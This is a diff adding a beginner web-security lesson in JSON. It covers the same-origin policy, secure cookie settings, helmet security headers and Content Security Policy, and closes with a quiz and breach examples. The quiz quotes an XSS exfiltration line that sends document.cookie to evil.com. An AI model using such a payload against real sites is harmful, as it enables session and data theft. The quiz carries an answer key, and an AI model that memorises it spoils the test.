@@ -1,0 +1,93 @@
+{
+  "id": "03-http-security-basics",
+  "version": "1.0.0",
+  "technology": "websecurity",
+  "module": "web-attack-fundamentals",
+  "title": "HTTP Security Basics",
+  "subtitle": "How cookies, same-origin policy, and security headers form the browser's security model",
+  "difficulty": "beginner",
+  "estimatedMinutes": 13,
+  "status": "published",
+  "prerequisites": ["websecurity/02-owasp-top-10"],
+  "skillsTaught": ["websecurity.same-origin-policy", "websecurity.cookies", "websecurity.security-headers", "websecurity.https"],
+  "content": [
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "The Same-Origin Policy"
+    },
+    {
+      "type": "paragraph",
+      "text": "The browser's most fundamental security control is the Same-Origin Policy (SOP). It prevents JavaScript on one origin from reading responses from a different origin. An 'origin' is the combination of scheme + hostname + port: <code>https://myapp.com:443</code>. Without SOP, a malicious site could read your bank's response to a request made using your session cookie — stealing your balance, account number, and transaction history."
+    },
+    {
+      "type": "code",
+      "lang": "text",
+      "filename": "Same-Origin Policy examples",
+      "code": "Origin: https://myapp.com\n\nSAME origin (allowed):\n  https://myapp.com/api/users          ← same scheme, host, port\n  https://myapp.com/dashboard          ← just a different path\n\nDIFFERENT origin (blocked by SOP):\n  http://myapp.com                     ← different scheme (http vs https)\n  https://api.myapp.com                ← different subdomain\n  https://myapp.com:8080               ← different port\n  https://othersite.com                ← different host\n\nWHAT SOP BLOCKS:\n  JavaScript reading the RESPONSE body from a cross-origin fetch()\n  JavaScript accessing an iframe's DOM from a different origin\n  localStorage and cookies from other origins\n\nWHAT SOP DOES NOT BLOCK (important!):\n  Sending requests to other origins (you CAN send, just can't read responses)\n  This is why CSRF is still possible even with SOP"
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Cookie security attributes"
+    },
+    {
+      "type": "code",
+      "lang": "typescript",
+      "filename": "Secure cookie configuration in Node.js/Express",
+      "code": "// Set a session cookie with all security attributes\nres.cookie('sessionId', token, {\n  // HttpOnly: JavaScript cannot read this cookie\n  // Prevents XSS from stealing the session token\n  httpOnly: true,\n\n  // Secure: cookie only sent over HTTPS, never HTTP\n  // Prevents eavesdropping on unencrypted connections\n  secure: process.env.NODE_ENV === 'production',\n\n  // SameSite: controls when cookie is sent cross-site\n  // 'strict' — never sent cross-site (breaks OAuth flows)\n  // 'lax'    — sent on top-level navigation (GET), not POST (recommended)\n  // 'none'   — always sent (requires Secure: true) — only for embeds\n  sameSite: 'lax',\n\n  // maxAge: cookie expires after this many milliseconds\n  maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days\n\n  // path: cookie only sent for this path prefix\n  path: '/',\n});\n\n// INSECURE — never do this:\nres.cookie('sessionId', token);  // Missing all security attributes\n// → JavaScript can steal it (XSS)\n// → Sent over HTTP (eavesdropping)\n// → Sent cross-site (CSRF possible)"
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Security headers — your second line of defence"
+    },
+    {
+      "type": "code",
+      "lang": "typescript",
+      "filename": "Security headers with helmet (Express)",
+      "code": "import helmet from 'helmet';\n\n// Helmet sets all important security headers automatically\napp.use(helmet());\n\n// What helmet sets:\n\n// Content-Security-Policy: controls what resources the browser loads\n// Prevents XSS by blocking inline scripts and scripts from untrusted origins\n// Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.myapp.com\n\n// X-Frame-Options: DENY\n// Prevents your page being embedded in an iframe (clickjacking prevention)\n// Superseded by CSP frame-ancestors, but set both for compatibility\n\n// X-Content-Type-Options: nosniff\n// Prevents browser 'MIME sniffing' — a file served as text/plain won't run as JavaScript\n\n// Strict-Transport-Security: max-age=31536000; includeSubDomains\n// Forces HTTPS for 1 year — browser will refuse HTTP connections\n\n// Referrer-Policy: strict-origin-when-cross-origin\n// Controls how much URL info is sent in the Referer header to other sites\n\n// Permissions-Policy: camera=(), microphone=(), geolocation=()\n// Disables browser features your app doesn't need"
+    },
+    {
+      "type": "code",
+      "lang": "text",
+      "filename": "Content Security Policy — the most powerful header",
+      "code": "Content-Security-Policy controls what the browser is allowed to load.\nEach directive specifies a resource type and allowed sources.\n\nDIRECTIVES:\n  default-src    fallback for unspecified resource types\n  script-src     where JavaScript can be loaded from\n  style-src      where CSS can be loaded from\n  img-src        where images can be loaded from\n  connect-src    where fetch/XHR/WebSocket can connect\n  font-src       where fonts can be loaded from\n  frame-ancestors who can embed this page in an iframe\n  report-uri     where CSP violation reports are sent\n\nSOURCE VALUES:\n  'self'         same origin as the document\n  'none'         block everything\n  https:         any HTTPS source\n  'unsafe-inline'  allow inline scripts/styles (weakens XSS protection)\n  'nonce-{value}' allow a specific inline script with a matching nonce\n  https://cdn.example.com  specific trusted domain\n\nEXAMPLE (tight policy for a React SPA):\n  Content-Security-Policy:\n    default-src 'self';\n    script-src 'self';\n    style-src 'self' https://fonts.googleapis.com;\n    font-src 'self' https://fonts.gstatic.com;\n    img-src 'self' data: https:;\n    connect-src 'self' https://api.myapp.com;\n    frame-ancestors 'none'"
+    },
+    {
+      "type": "quiz",
+      "questions": [
+        {
+          "id": "websecurity-03-q1",
+          "question": "An attacker injects JavaScript into your page that runs: fetch('https://evil.com?data=' + document.cookie). The session cookie has HttpOnly: true. What happens?",
+          "type": "multiple-choice",
+          "options": [
+            "The cookie is sent to evil.com — HttpOnly doesn't protect against this",
+            "The fetch is blocked — HTTPS is required for cross-origin requests",
+            "document.cookie returns an empty string — HttpOnly cookies are invisible to JavaScript",
+            "The browser prompts the user before sending the cookie"
+          ],
+          "correctAnswer": 2,
+          "explanation": "HttpOnly cookies are completely invisible to JavaScript — document.cookie does not include them, and they cannot be accessed by any JavaScript API. The XSS attack can still run, but it cannot steal the session cookie. The attacker gets an empty string. This is exactly why HttpOnly is critical for session tokens: even if XSS exists, the attacker can't steal the session. Note: the attacker could still perform other damage (like submitting forms or reading page content), but they can't take over the session in a different browser."
+        }
+      ]
+    }
+  ],
+  "faq": [
+    {
+      "q": "Does my frontend app (React SPA) need security headers?",
+      "a": "Yes — headers are set by the server serving your index.html and static assets (Nginx, Vercel, Netlify, CloudFront). Even if your React app has no backend, the file server can and should set security headers. Vercel and Netlify let you configure them in vercel.json and netlify.toml respectively. Without them, your app is vulnerable to clickjacking and your CSP is non-existent."
+    }
+  ],
+  "sources": [
+    { "name": "MDN — HTTP Security Headers", "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#security", "verified": "2026-11-04" },
+    { "name": "Content Security Policy reference", "url": "https://content-security-policy.com/", "verified": "2026-11-04" }
+  ],
+  "realWorld": {
+    "usedIn": ["every web app", "browser security model", "XSS prevention"],
+    "examples": [
+      "Google sets one of the most restrictive CSPs in production. Their search page uses nonces for each inline script — a unique random value per request that the CSP whitelist includes. This means that even if an attacker injects a script tag, it has no valid nonce and the browser refuses to run it",
+      "The British Airways breach (2018, 500,000 customers, £20M GDPR fine) was caused by a script injected into their payment page that sent card details to the attacker's server. A Content-Security-Policy header restricting connect-src to British Airways' own domains would have blocked the data exfiltration"
+    ]
+  }
+}
